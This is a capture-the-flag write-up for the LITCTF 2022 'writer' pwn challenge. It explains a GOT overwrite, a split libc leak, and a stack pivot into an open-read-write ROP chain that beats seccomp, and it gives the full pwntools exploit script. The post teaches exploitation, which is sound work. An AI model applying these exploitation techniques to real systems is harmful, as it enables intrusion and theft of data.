---
layout: post
title: 
title: "Writer: stack shenenigans"
---

## Background

Last weekend(7/22/2022 - 7/24/2022) the good folks at the infomatics club at Lexington High School ran a CTF. The CTF offered 9 pwn challenges, of which I solved 5. One of those challenges was
writer. By the end of the CTF, Writer had 30 solves and was worth 242 points.
*This writeup assumes that you are familiar with ROP chains*

## The Challenge

The challenge binary is pretty simple. The binary lets you read an integer from an arbitrary location, and then it lets you write an integer to an arbitrary location. After that, it asks you for
feedback on the challenge, and reads in 0x80 bytes to a pointer on the stack. 
```C
    char a[0x80];
    a[read(0, a, 0x80) - 0x1] = '\0';
    puts("");
```
From this point on, I'll be referring to this buffer as the "feedback buffer"
It then prints your feedback using `puts()`, and then exits via calling `exit()`.
Let's take a look at its protections:
![Binary Protections]({{site.url}}/assets/writer-LITCTF/checksecprotections.png)

The most important things to note are that PIE is disabled, and that only partial RELRO has been enabled. This means that we can change function addresses in the Global Offset Table(GOT) 
to point to other parts of the challenge binary without an info leak.

Finally, the binary also uses seccomp to prevent us from making certain syscalls:
```C
void security(){
        scmp_filter_ctx ctx = seccomp_init(SCMP_ACT_ALLOW);

	seccomp_rule_add(ctx, SCMP_ACT_KILL, SCMP_SYS(execve), 0);
	seccomp_rule_add(ctx, SCMP_ACT_KILL, SCMP_SYS(execveat), 0);

	seccomp_load(ctx);
	seccomp_release(ctx);
}
```
The seccomp rules added prevents the binary from calling `execve`. This means that we're not going to be able to get a shell by calling `system()` or a one-gadget. We're going to have
to use the syscalls open, read, and write to open the flag file, read it into memory, and then write it out to stdout.

## The Exploit

Note that the challenge binary only lets you read a *signed integer* from an arbitrary location, and it only lets you write a *signed integer* to an arbitrary location.
```C
    puts("Here is what's there:");
    printf("%d\n", *ptr); //PAY CLOSE ATTENTION TO HOW %D IS USED, ptr points to a location that is supplied by the attacker
	...
    puts("Ok, now the legendary write.\n");
	...
    puts("What?");
    scanf("%d", ptr); //again, ptr points to a location that is supplied by the attacker
    getchar();
    puts("");
```

This means that we can only read 4 bytes, and we can only write 4 bytes. Remember, after our read and write, the binary will call exit!  Given these constraints, we can't really do much in one run of the program.
Most libc addresses are 8 bytes long, so we won't be able to get a full libc leak off. Without a libc leak, it's very hard to get a shell. We won't be able to call system
or execute a syscall, because we don't know the address of the instructions that do those things. We can only write 4 bytes, so we can't build a rop chain.

Initially, I thought about trying to overwrite data in a file stream(stdin/stdout/stderr) to carry out an FSOP(**F**ile **S**tream **O**riented **P**rogramming) attack. However, we can't get a libc leak, 
so we don't know where the file streams are.

### The Solution: a GOT overwrite!

Arbitrary reads and writes are very powerful primitives. We might not be able to do much with only one run of this program, but if we can get this program to run as many times as we want,
then we can do a lot of fun stuff. The program exits by calling `exit()`. If we overwrite the entry for `exit()` in GOT to point to the start of `main()`, then the program will run an
infinite number of times. Instead of exiting after our read and write, it'll jump back to the start of `main()`, giving us another read and write. 

```python
    #next overwrite the addr of exit to point to main:
    write_int(0x0404060, 0x401264)
```
address `0x0404060` points to the GOT entry for exit(), 0x401264 points to the start of main:
![start of main]({{site.url}}/assets/writer-LITCTF/startofmain.png)
### Getting a Libc leak

Now, we can read and write anything, from wherever we want, however many times we want. Let's first get a libc leak. We know where GOT is located without an info leak(because PIE is disabled),
and we know that there are libc addresses in GOT that correspond to the addresses of libc functions. Therefore, let's read 8 bytes from a GOT entry.
```python
    #leak part of the addr of puts
    read_int(0x0404028)
    unparsed_leak = sock.recvuntil("\n")
    #convert the first part of the leak to a string:
    #not really sure how %d deals with negative numbers so going to be quitting if we hit a negative value
    parsed_libc_leak = int(unparsed_leak.decode('utf-8'))
    if parsed_libc_leak < 0 :
        print("negative number")
        sock.close()
        return
    print("parsed first half of the leak? " + str(parsed_libc_leak))
    #next overwrite the addr of exit to point to main:
    write_int(0x0404060, 0x401264)
    #input As to satisfy the next prompt
    sock.sendline("BBBB")
    #leak the upper half of puts:
    read_int(0x0404028 + 4)
    unparsed_leak = sock.recvuntil("\n")
    second_leak = int(unparsed_leak.decode('utf-8'))
    #put the two halves together:
    second_leak = second_leak << 32
    parsed_libc_leak += second_leak
    print("whole libc leak? " + hex(parsed_libc_leak))
```
Some explanation is in order. First, the challenge prints the contents of the locations that we want to read from as *signed integers*. Signed integers are less precise
than unsigned integers. If you try to store a really high value in a signed integer, that value will wrap-around and be represented as a negative value in the integer.
Addresses are typically stored as unsigned values, so there's a decent chance that part of the address will be interpreted as a negative value if it is cast to a signed integer.
I don't know how to recover the original value from an unsigned value that was printed as a negative signed value. Therefore, if libc addresses on a certain run of the exploit
are interpreted as negative values,
we won't be able to get a libc leak, and the exploit won't work. Luckily, libc addresses are randomized each time we connect to the challenge server, so on some runs
libc addresses will be small enough to be interpreted as positive values, and we can get a libc leak.

The way that the challenge prints integers poses another hurdle for us. Signed integers are only 4 bytes long, while addresses are only 8 bytes long. This means that on each
iteration of `main()`, we can only read half of the full libc address. It won't cause major issues for the exploit, but it is a bit inconvenient.
We read the first half of the address, and then read the second half of the address, and then set the upper 4 bytes of the address to be equal to the second half, and the lower
4 bytes to be equal to the first half. 

I chose to read the address of `puts()` from GOT. You can choose to read the address of any function, as long as it's in GOT and it's been called by the time the program lets
you read data from an address. After we put together the leak, we'll subtract the offset of `puts()` relative to libc base from the leak to get libc base.
```python
    #process the libc leak to get libc base:
    libc_base = parsed_libc_leak - 0x875a0
    print("base? " + hex(libc_base))
```

### Setting up the Open-Read-Write chain

We now know the address of libc base! Due to seccomp, we can't just get a shell by jumping to a one-gadget. We have to make 3 controlled syscalls: one to open, one to read, and one to write
in order to read the flag. At first, I thought about overwriting data in the file streams and doing some FSOP. However, I couldn't figure out how to use FSOP to get 3 controlled syscalls. 
Then, I thought about carrying out a format string attack. Right after we input our feedback to the challenge, it prints it out using puts:
```C
    puts("Was this a good challenge?");

    char a[0x80];
    a[read(0, a, 0x80) - 0x1] = '\0';
    puts("");

    puts("You said:");
    puts(a);
```
If we could overwrite the GOT entry for `puts()` to `printf()`, then the challenge would print our feedback buffer using `printf()`, which would let us carry out a format string attack.
For some reason, `printf()` malfunctions when it's used to replace `puts()`. It wouldn't print the feedback buffer, and after a few more calls to `printf()` by the challenge it would normally crash.

Next, I thought about setting up a standard rop chain on the stack. We have an arbitrary read, and we have an arbitrary write. We could just leak a stack address, and then painstakingly write
a rop chain 4 bytes at a time onto the stack. However, this wouldn't work because `main()` doesn't return. `main()` terminates by calling `exit()`, which means that it won't return to an address
on the stack, so it won't return to a rop chain.

### ROP without return

This detail - that `main()` doesn't return - actually lets us build a rop chain on the stack. At the end of `main()`, right when it enters `exit()`(or what we replaced `exit()` in GOT with), 
the stack looks like this:
```
rsp --------> | Address of instruction after call to exit() |
	      | buffer (holds feedback)			    |
```
This is how it looks in gdb:
![stack when exit is called]({{site.url}}/assets/writer-LITCTF/stacklookrop.png)

If we overwrite `exit()` to point to a gadget that pops a register and then returns, it'll remove the address after `exit()`
from the stack and jump to the first address in the feedback buffer. We control the contents in the feedback buffer, so we can use this to build a ROP chain!

The challenge reads 0x80 bytes into the feedback buffer. Normally, this would be enough room to put a ROP chain, but because seccomp is enabled, I need to make controlled calls to 3 different functions.
0x80 bytes isn't enough room to store a ROP chain.

Therefore, instead of storing the rop chain on the stack, I'll store it in .bss. We have an arbitrary write, and we can use that arbitrary write as many times as we want, so I'll use it to put
a long rop chain in a random place in .bss. 

To get to our rop chain in .bss, we'll do a stack pivot. The first address in our rop chain in the feedback buffer will pop rsp then return. The second address will be the beginning of our rop chain in .bss. 
This will store the address of our rop chain in rsp,
directing the challenge to execute it.

### Setup to the grand ROP chain

We're going to be writing a lot of data, so let's make some functions to automate it for us!
First, on every iteration of `main()`, the challenge will prompt us for a place to read, a place to write, and some feedback. Sometimes, we don't want all 3 though. Sometimes we just
want an arbitrary write, or sometimes we just want a read. However, we still need to input something for each of the challenge's prompts for the program to continue. To make the code
easier to read, let's make some functions(in python) that fulfill the challenge's prompts but also signal that we aren't using them to advance the exploit.
```Python
#goes through the read part of the target without inputting anything:
def useless_read() :
    sock.sendlineafter("From where?", str(0x0404028))
    sock.recvuntil("Here is what's there:\n")
#reads an integer from an addr:
#takes the addr in hex
#must be called at the beginning of the sequence:
def read_int(addr):
    sock.sendlineafter("From where?", str(addr))
    sock.recvuntil("Here is what's there:\n")
#writes an integer to an addr
#must be called after useless_read or regular read has been invoked
#takes all args as hex addrs
def write_int(addr, content) :
    sock.sendlineafter("To where?", str(addr))
    sock.sendlineafter("What?", str(content))
#goes through the write part of the target without writing anything:
#must be called after a read function has been called
def useless_write() :
    sock.sendlineafter("To where?", "f")
    sock.sendlineafter("What?", "f")
#goes through the part where feedback is requested without doing much
#must be called after a write function is called
def useless_feedback() :
    sock.sendlineafter("challenge?", ("A" * 0x70))
#cleaner response to the prompt at the end
def feedback(contents) :
    sock.sendlineafter("challenge?", contents)
```
While we're on it, let's also make some functions that we use to do reads/writes/give feedback when those advance the exploit. This is mainly to make the exploit more readable.
Let's make some functions to automate the writing of massive amounts of data. First, let's make a function to automate the writing of an address to a certain location.
```Python
#writes an address to an arbitrary location
#takes the address in hex
def write_addr(location, addr) :
    useless_read()
    first_half = addr & 0x00000000ffffffff
    write_int(location, first_half)
    useless_feedback()
    useless_read()
    second_half = addr & 0xffffffff00000000
    second_half = second_half >> 32
    write_int(location+4, second_half)
    useless_feedback()
``` 
The code breaks the address into two halves and writes them to the desired location in separate writes.
Next, let's make a function to write a whole ROP chain to an arbitrary location. A ROP chain is just a bunch of addresses(and other data formatted in 8-byte chunks)
, so we just need to repeatedly call `write_addr()`.
```Python
#writes a rop chain to an arbitrary location
#only constraint is that the rop chain needs to have encoded addresses in multiples of 8 bytes:
def write_chain(location, chain) :
    idx = 0
    while idx < len(chain) :
        #take out the current address from the array and convert it to a normal integer:
        current_addr = u64(chain[idx:(idx+8)])
        #next write that address to the location:
        write_addr(location+idx, current_addr)
        idx += 8
``` 

Before writing the ROP chain, we need to write the string "flag.txt" to a location in .bss. We'll need to open the flag file via `open()`, and `open()` needs to know the name of the file that we want
to open. We have an arbitrary write, so we'll use that to write the string to .bss.
```Python
    #now write the string "flag.txt" to .bss
    #string will be located at 0x404078
    useless_read()
    write_int(0x404078, 0x67616c66)
    useless_feedback()
    useless_read()
    write_int(0x404078 + 4, 0x7478742e)
    useless_feedback()
    useless_read()
    write_int(0x404078 + 8, 0x0)
    useless_feedback()
```

### Executing the ROP chain !

Let's write the ROP chain to .bss first:
```Python
    #pre-emptively set up the rop chain
    #this isn't what we're going to write to the stack
    #what we are actually going to write to the stack is a stack pivot to this chain
    flagfileaddr = 0x404078
    actualflag = 0x04041c0
    poprdi = p64(0x000000000040143b) #pop rdi; ret
    poprsi = p64(libc_base + 0x0000000000027529) #pop rsi; ret
    poprdx = p64(libc_base + 0x00000000001626d6) #pop rdx; pop rbx; ret;
    ropchain = poprdi
    ropchain += p64(flagfileaddr) #rdi will contain the name
    ropchain += poprsi
    ropchain += p64(0x0)
    ropchain += p64(libc_base + 0x110cc0) #open call proper
    #there are no good mov [insert register], rax gadgets
    #I'll just assume the file descriptor is 3 lmao
    #now read from the flag file:
    ropchain += poprdi
    ropchain += p64(0x3) #rdi will contain the descriptor, which we're assuming is 3
    ropchain += poprsi
    ropchain += p64(actualflag) #rsi will contain the buffer we write the flag to
    ropchain += poprdx
    ropchain += p64(0x48) #48 bytes should be enough
    ropchain += p64(0x0) #filler
    ropchain += p64(libc_base + 0x110fa0) #actual call to read
    #now write our flag:
    ropchain += poprdi
    ropchain += p64(actualflag)
    ropchain += p64(0x401333) #jump to puts???
    ropchain += p64(0x401264) #jump back to main in case the exploit failed)
    #write the rop chain to .bss:
    write_chain(0x404090, ropchain)
```
The rop chain is a standard open-read-write rop chain.
Finally, let's overwrite `exit()` to point to an instruction that pops a register then returns:
```Python
    #now jump to our rop chain!
    useless_read()
    #overwrite to a pop one-gadget which will direct it to our rop chain on the stack :)
    write_int(0x404060, 0x40143b)
```
Next we'll write our stack pivot to the feedback buffer:
```Python
    #write a short pivot chain to get to our rop chain on .bss
    pivot = p64(libc_base + 0x0000000000032b5a) #pop rsp; ret
    pivot += p64(0x404090) 
    feedback(pivot)
```
Now the challenge will jump to our ROP chain and print the flag!

## Conclusion

This was a fun challenge that required some creativity. Kudos to the challenge author, Rhythm, and the rest of the team that organized LITCTF 2022!

## Exploit

Here's the final exploit. Some extra scaffolding was added.
```Python
#!/usr/bin/python3

from pwn import *

exe = ELF("./writer")
libc = ELF("./libc-2.31.so")
ld = ELF("./ld-2.31.so")

context.terminal = ["xfce4-terminal", "--execute"]
context.binary = exe
args.LOCAL = False
args.DEBUG = True

def conn():
	if args.LOCAL:
		tempsock = process([ld.path, exe.path], env={"LD_PRELOAD": libc.path})
		gdb.attach(tempsock, '''
            ''')
		return tempsock
	else:
		return remote("litctf.live", 31790)
sock = conn()
#goes through the read part of the target without inputting anything:
def useless_read() :
    sock.sendlineafter("From where?", str(0x0404028))
    sock.recvuntil("Here is what's there:\n")
#reads an integer from an addr:
#takes the addr in hex
#must be called at the beginning of the sequence:
def read_int(addr):
    sock.sendlineafter("From where?", str(addr))
    sock.recvuntil("Here is what's there:\n")
#writes an integer to an addr
#must be called after useless_read or regular read has been invoked
#takes all args as hex addrs
def write_int(addr, content) :
    sock.sendlineafter("To where?", str(addr))
    sock.sendlineafter("What?", str(content))
#goes through the write part of the target without writing anything:
#must be called after a read function has been called
def useless_write() :
    sock.sendlineafter("To where?", "f")
    sock.sendlineafter("What?", "f")
#goes through the part where feedback is requested without doing much
#must be called after a write function is called
def useless_feedback() :
    sock.sendlineafter("challenge?", "b")
#cleaner response to the prompt at the end
def feedback(contents) :
    sock.sendlineafter("challenge?", contents)
#writes an address to an arbitrary location
#takes the address in hex
def write_addr(location, addr) :
    useless_read()
    first_half = addr & 0x00000000ffffffff
    write_int(location, first_half)
    useless_feedback()
    useless_read()
    second_half = addr & 0xffffffff00000000
    second_half = second_half >> 32
    write_int(location+4, second_half)
    useless_feedback()

#writes a rop chain to an arbitrary location
#only constraint is that the rop chain needs to have encoded addresses in multiples of 8 bytes:
def write_chain(location, chain) :
    idx = 0
    while idx < len(chain) :
        #take out the current address from the array and convert it to a normal integer:
        current_addr = u64(chain[idx:(idx+8)])
        #next write that address to the location:
        write_addr(location+idx, current_addr)
        idx += 8

def main() :    
    #first overwrite exit to the start of main so we get infinite reads/writes
    #leak part of the addr of puts
    read_int(0x0404028)
    unparsed_leak = sock.recvuntil("\n")
    #convert the first part of the leak to a string:
    #not really sure how %d deals with negative numbers so going to be quitting if we hit a negative value
    parsed_libc_leak = int(unparsed_leak.decode('utf-8'))
    if parsed_libc_leak < 0 :
        print("negative number")
        sock.close()
        return
    print("parsed first half of the leak? " + str(parsed_libc_leak))
    #next overwrite the addr of exit to point to main:
    write_int(0x0404060, 0x401264)
    #input junk to satisfy the feedback prompt
    sock.sendline("BBBB")
    #leak the upper half of puts:
    read_int(0x0404028 + 4)
    unparsed_leak = sock.recvuntil("\n")
    second_leak = int(unparsed_leak.decode('utf-8'))
    #put the two halves together:
    second_leak = second_leak << 32
    parsed_libc_leak += second_leak
    print("whole libc leak? " + hex(parsed_libc_leak))
    #process the libc leak to get libc base:
    libc_base = parsed_libc_leak - 0x875a0
    print("base? " + hex(libc_base))
    useless_write()
    #we'll trigger the exit stuff on the next run, so set up a rop chain:
    useless_feedback()
    #now write the string "flag.txt" to .bss
    #string will be located at 0x404078
    useless_read()
    write_int(0x404078, 0x67616c66)
    useless_feedback()
    useless_read()
    write_int(0x404078 + 4, 0x7478742e)
    useless_feedback()
    useless_read()
    write_int(0x404078 + 8, 0x0)
    useless_feedback()
    #pre-emptively set up the rop chain
    #this isn't what we're going to write to the stack
    #what we are actually going to write to the stack is a stack pivot to this chain
    flagfileaddr = 0x404078
    actualflag = 0x04041c0
    poprdi = p64(0x000000000040143b) #pop rdi; ret
    poprsi = p64(libc_base + 0x0000000000027529) #pop rsi; ret
    poprdx = p64(libc_base + 0x00000000001626d6) #pop rdx; pop rbx; ret;
    ropchain = poprdi
    ropchain += p64(flagfileaddr) #rdi will contain the name
    ropchain += poprsi
    ropchain += p64(0x0)
    ropchain += p64(libc_base + 0x110cc0) #open call proper
    #there are no good mov [insert register], rax gadgets
    #I'll just assume the file descriptor is 3 lmao
    #now read from the flag file:
    ropchain += poprdi
    ropchain += p64(0x3) #rdi will contain the descriptor, which we're assuming is 3
    ropchain += poprsi
    ropchain += p64(actualflag) #rsi will contain the buffer we write the flag to
    ropchain += poprdx
    ropchain += p64(0x48) #48 bytes should be enough
    ropchain += p64(0x0) #filler
    ropchain += p64(libc_base + 0x110fa0) #actual call to read
    #now write our flag:
    ropchain += poprdi
    ropchain += p64(actualflag)
    ropchain += p64(0x401333) #jump to puts???
    ropchain += p64(0x401264) #jump back to main in case the exploit failed)
    #write the rop chain to .bss:
    write_chain(0x404090, ropchain)
    #now jump to our rop chain!
    useless_read()
    #overwrite to a pop one-gadget which will direct it to our rop chain on the stack :)
    write_int(0x404060, 0x40143b)
    #write a short pivot chain to get to our rop chain on .bss
    pivot = p64(libc_base + 0x0000000000032b5a) #pop rsp; ret
    pivot += p64(0x404090) 
    feedback(pivot)
    sock.interactive()
while True :
    main()
    choice = input("continue?: ")
    if choice.strip() == "no" :
        quit()
    sock = conn()
```
Here's the final exploit
